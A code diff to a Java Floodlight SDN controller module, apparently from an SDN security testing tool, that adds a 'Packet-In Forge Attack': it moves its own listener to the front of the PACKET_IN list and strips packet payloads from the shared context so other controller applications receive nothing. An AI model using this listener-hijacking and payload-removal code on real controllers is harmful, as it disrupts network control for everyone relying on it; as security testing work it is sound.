@@ -125,6 +125,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 	private boolean isLoop;
 	private SystemTime sys;
 	private HashMap<String, Integer> map = new HashMap<>();
+	private boolean isRemovedPayload;
 
 	private IStaticFlowEntryPusherService fservice;
 	private Communication cm;
@@ -192,15 +193,16 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 				.getServiceImpl(ILinkDiscoveryService.class);
 
 		blockLLDPPacket();
-		// cm = new Communication(this);
-		// cm.setServerAddr("127.0.0.1", 3366);
-		// cm.connectServer("AppAgent");
-		// cm.start();
+
+		cm = new Communication(this);
+		cm.start();
 	}
 
 	@Override
 	public void startUp(FloodlightModuleContext context)
 			throws FloodlightModuleException {
+		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
+		/*
 		// TODO Auto-generated method stub
 		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
 		floodlightProvider.addOFMessageListener(OFType.FLOW_REMOVED, this);
@@ -228,11 +230,11 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		floodlightProvider.addOFMessageListener(OFType.STATS_REPLY, this);
 		floodlightProvider.addOFMessageListener(OFType.STATS_REQUEST, this);
 		// sniffingListener();
+		*/
 	}
 
 	// A-2-M
 	public boolean Set_Control_Message_Drop() {
-		System.out.println("[AppAgent] Control_Message_Drop");
 		isDrop = true;
 
 		List<IOFMessageListener> listeners = floodlightProvider.getListeners()
@@ -259,14 +261,13 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);
 
 		for (IOFMessageListener listen : listeners) {
-			System.out.println(listen.getName());
+			//System.out.println(listen.getName());
 		}
 
 		return true;
 	}
 
 	public String Control_Message_Drop() {
-		System.out.println("[AppAgent] Control_Message_Drop");
 		String drop = "nothing";
 
 		for (int i = 0; i < 10; i++) {
@@ -753,6 +754,76 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 		ScheduledExecutorService ses = threadPoolService.getScheduledExecutor();
 	}
 
+    public void testSwappingList() {
+        List<IOFMessageListener> packetin_listeners = floodlightProvider
+                .getListeners().get(OFType.PACKET_IN);
+	System.out.println("[Agent-Manager] Start Packet-In Forge Attack");
+
+        System.out.println("[App-Agent] (before) List of Packet-In Listener: " + packetin_listeners.size());
+
+        int cnt = 1;
+
+        for (IOFMessageListener listen : packetin_listeners) {
+            System.out.println("[App-Agent] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
+        }
+
+        IOFMessageListener temp = packetin_listeners.get(0);
+        packetin_listeners.set(packetin_listeners.size() - 1, temp);
+        packetin_listeners.set(0, this);
+
+	try {
+            Thread.sleep(10000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }	
+
+        cnt = 1;
+
+        System.out.println("\n\n[App-Agent] (after) List of Packet-In Listener: " + packetin_listeners.size());
+
+        for (IOFMessageListener listen : packetin_listeners) {
+            System.out.println("[App-Agent] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
+        }
+
+        isRemovedPayload = true;
+    }
+/*
+    @Override
+    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
+        // System.out.println("[App-Agent] receive message " + msg.toString() + isDrop);
+
+        // TODO Auto-generated method stub
+        switch (msg.getType()) {
+            case PACKET_IN:
+                // System.out.println("[App-Agent] receive message " + msg.toString() + " " + isDrop);
+
+                OFPacketIn pi = (OFPacketIn) msg;
+                Ethernet eth = IFloodlightProviderService.bcStore.get(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+
+                IPacket pkt = eth.getPayload();
+                IPv4 ip_pkt = null;
+
+                if (isDrop) {
+                    System.out.println("[App-Agent] Drop message " + msg.toString());
+
+                    if (droppedPacket == null)
+                        droppedPacket = pi;
+
+                    return Command.STOP;
+                } else if (isLoop) {
+                    this.testInfiniteLoop();
+                } else if (isRemovedPayload) {
+                    System.out.println("[Agent-Manager] Start Packet-In Forge Attack");
+                    IFloodlightProviderService.bcStore.remove(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+                }
+
+                return Command.CONTINUE;
+        }
+
+        return Command.CONTINUE;
+    }
+*/
+
 	@Override
 	public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
 		// TODO Auto-generated method stub
@@ -763,7 +834,6 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 //			sniffingListener();
 
 			OFPacketIn pi = (OFPacketIn) msg;
-
 			Ethernet eth = IFloodlightProviderService.bcStore.get(cntx,
 					IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
 
@@ -784,9 +854,20 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener,
 			if (droppedPacket == null) {
 				this.Set_Control_Message_Drop();
 				droppedPacket = pi;
-			} else {
+			} else if (isRemovedPayload) {
+
 				IFloodlightProviderService.bcStore.remove(cntx,
 						IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+				Ethernet tempEth = IFloodlightProviderService.bcStore.get(cntx,
+                                        IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
+				System.out.println("[PacketIn Message] (before) " + msg);
+
+				System.out.println("[PacketIn Message] (after) " + tempEth);
+				try {
+                                    Thread.sleep(5000);
+                                } catch (InterruptedException e) {
+                                    e.printStackTrace();
+                                }
 				
 			}
 			
